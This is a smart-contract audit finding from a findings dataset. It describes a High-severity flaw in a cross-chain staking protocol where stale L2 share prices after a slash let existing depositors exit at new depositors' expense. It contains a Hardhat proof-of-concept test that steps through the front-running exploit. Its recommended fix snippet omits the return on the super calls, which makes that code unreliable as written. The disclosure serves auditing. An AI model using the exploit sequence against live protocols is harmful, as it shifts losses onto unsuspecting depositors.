# [H] Slashing loss redistribution vulnerability allows existing depositors to avoid losses at new depositors' expense

## Summary
Severity: High
Contest weight: 1.0000
Dataset id: 22225
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The protocol's staking system spans L1 (Ethereum) and L2 (Metis) with state updates propagated via Chainlink CCIP. Current design is exposed to timing vulnerability where slashing events on Metis are not immediately reflected in the share price calculation on L2, allowing earlier depositors to exit at inflated share prices at the expense of new depositors.

The core issue stems from L2Strategy's total deposits calculation which depends on stale L1 state until a CCIP update is received:

```solidity
// L2Strategy.sol
function getTotalDeposits() public view override returns (uint256) {
    return l1TotalDeposits + tokensInTransitToL1 + tokensInTransitFromL1 + token.balanceOf(address(this));
}
```
When slashing occurs on Metis, it's visible in L1Strategy.getDepositChange() but not reflected in totalDeposits until updateDeposits is called via CCIP:

```solidity
// L1Strategy.sol
function getDepositChange() public view returns (int) {
    uint256 totalBalance = token.balanceOf(address(this));
    for (uint256 i = 0; i < vaults.length; ++i) {
        totalBalance += vaults[i].getTotalDeposits();
    }
    return int(totalBalance) - int(totalDeposits);
}
```
This can lead to a potential scenario that spans as follows:

Slashing occurs on Metis and is visible in L1Strategy.getDepositChange()
New deposits on L2 receive shares at an inflated price (using stale L1 state)
Earlier depositors can withdraw using this new liquidity at pre-slash value
When the slash is finally reflected via CCIP, the last depositor bears most of the loss

New depositors could get fewer shares than they should even if they deposited after slashing on L1
Front-running slashing can allow old depositors to exit using liquidity created by new depositors. As a result, a disproportionate slashing impact falls on recent depositors.

## Proof of Concept
Run the following test. For this test, `allowInstantWithdrawals` is set to `true` on PriorityPool.

```solidity
  it('front running on metis', async () => {
    const {
      signers,
      accounts,
      l2Strategy,
      l2Metistoken,
      l2Transmitter,
      stakingPool,
      priorityPool,
      metisLockingInfo,
      metisLockingPool,
      l1Metistoken,
      l1Transmitter,
      l1Strategy,
      vaults,
      offRamp,
    } = await loadFixture(deployFixture)

    // // setup Bob and Alice
    const bob = signers[7]
    const bobAddress = accounts[7]
    const alice = signers[8]
    const aliceAddress = accounts[8]
    const initialDeposit = toEther(1000)

    await l2Metistoken.transfer(bobAddress, initialDeposit)
    await l2Metistoken.connect(bob).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(bob).approve(priorityPool.target, ethers.MaxUint256)

    // Bob makes initial deposit
    await priorityPool.connect(bob).deposit(initialDeposit, false, ['0x'])
    assert.equal(await fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(
      await fromEther(await l2Strategy.getTotalQueuedTokens()),
      fromEther(initialDeposit)
    )

    // executeUpdate to send message and tokens to L1
    await l2Transmitter.executeUpdate({ value: toEther(10) })
    assert.equal(await fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(await fromEther(await l2Strategy.getTotalQueuedTokens()), 0)
    assert.equal(await fromEther(await l2Metistoken.balanceOf(l2Strategy.target)), 0)
    assert.equal(await fromEther(await l2Strategy.tokensInTransitToL1()), fromEther(initialDeposit))

    // deposit the tokens received form L2 in L1
    await l1Metistoken.transfer(l1Transmitter.target, initialDeposit) // mock the deposit via L2 Bridge
    await l1Transmitter.depositTokensFromL2() // deposits balance into L1 Strategy
    await l1Transmitter.depositQueuedTokens([1], [initialDeposit]) // deposits balance into vault 1

    let vault1 = await ethers.getContractAt('SequencerVault', (await l1Strategy.getVaults())[1])
    assert.equal(await fromEther(await vault1.getPrincipalDeposits()), fromEther(initialDeposit))

    // Confirm initial deposit via CCIP back to L2
    await offRamp
      .connect(signers[5])
      .executeSingleMessage(
        ethers.encodeBytes32String('messageId'),
        777,
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
          [initialDeposit, 0, initialDeposit, [], []]
        ),
        l2Transmitter.target,
        []
      )

    assert.equal(fromEther(await l2Strategy.l1TotalDeposits()), fromEther(initialDeposit))
    assert.equal(fromEther(await l2Strategy.tokensInTransitFromL1()), 0)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 0)
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(fromEther(await stakingPool.totalStaked()), fromEther(initialDeposit))

    assert.equal(fromEther(await stakingPool.balanceOf(bobAddress)), fromEther(initialDeposit))

    // simulate 20% slashing on Metis
    const slashAmount = toEther(200) // 20% of 1000
    await metisLockingPool.slashPrincipal(1, slashAmount)

    assert.equal(fromEther(await l1Strategy.getDepositChange()), -200)

    // At this point share price should still reflect 1000 tokens since slash isn't reflected
    // Alice deposits after slash but before it's reflected
    const aliceDeposit = toEther(1000)
    await l2Metistoken.transfer(alice.address, aliceDeposit)
    await l2Metistoken.connect(alice).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(alice).approve(priorityPool.target, ethers.MaxUint256)

    // Alice deposits at inflated share price
    await priorityPool.connect(alice).deposit(aliceDeposit, false, ['0x'])

    assert.equal(
      fromEther(await stakingPool.totalStaked()),
      fromEther(initialDeposit) + fromEther(aliceDeposit)
    )

    assert.equal(
      fromEther(await l2Strategy.getTotalDeposits()),
      fromEther(initialDeposit) + fromEther(aliceDeposit)
    )
    assert.equal(fromEther(await stakingPool.balanceOf(aliceAddress)), fromEther(aliceDeposit)) //1:1 conversion even though there is slashing
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), fromEther(aliceDeposit))
    assert.equal(
      fromEther(await l2Metistoken.balanceOf(l2Strategy.target)),
      fromEther(aliceDeposit)
    )

    // Bob sees the slashing on L2 and places a withdrawal request
    const bobBalanceBefore = await l2Metistoken.balanceOf(bobAddress)
    const bobWithdrawAmount = await stakingPool.balanceOf(bobAddress) // try to redeem all of Bob's shares for metis token

    await priorityPool.connect(bob).withdraw(
      bobWithdrawAmount,
      0,
      0,
      [],
      false,
      false, // Don't queue, withdraw instantly from available liquidity
      ['0x']
    )

    // Process Bob's withdrawal using Alice's new deposits
    const bobBalanceAfter = await l2Metistoken.balanceOf(bob.address)
    assert.equal(fromEther(bobBalanceAfter - bobBalanceBefore), fromEther(bobWithdrawAmount)) //full withdrawal even after slashing

    // Finally CCIP message arrives reflecting the slash
    await offRamp.connect(signers[5]).executeSingleMessage(
      ethers.encodeBytes32String('messageId2'),
      777,
      ethers.AbiCoder.defaultAbiCoder().encode(
        ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
        [toEther(800), 0, 0, [], []] // Now reflects the slash
      ),
      l2Transmitter.target,
      []
    )

    // Calculate Alice's actual value vs expected
    const aliceShareBalance = fromEther(await stakingPool.sharesOf(alice.address))
    const aliceCurrentValueOfShares = fromEther(await stakingPool.balanceOf(alice.address))
    assert.equal(aliceShareBalance, 1000)
    assert.equal(aliceCurrentValueOfShares, 800)
  })
```

## Recommendation
Consider the following recommendations:
- Disallow instant withdrawals on PriorityPool for the L2Strategy.
- Add a new owner controlled boolean state variable called `slashed`. Owner updates this variable to true as soon as slashing event occurs and resets it back to `false` once CCIP update is received on L2. When `slashed= true`, prevent all deposits and withdrawals on the strategy until the CCIP update by overriding the `canDeposit` and `canWithdraw` functions in `L2Strategy` as follows:

```solidity
  // @audit override in L2Strategy.sol
  function canWithdraw() public view override returns (uint256) {
        if(slashed) return 0; //@audit prevent withdrawals until slashing is updated on L2
        super.canWithdraw()
    }

    function canDeposit() public view override returns (uint256) {
        if(slashed) return 0; //@audit prevent deposits until slashing is updated on L2
        super.canDeposit()
    }
```
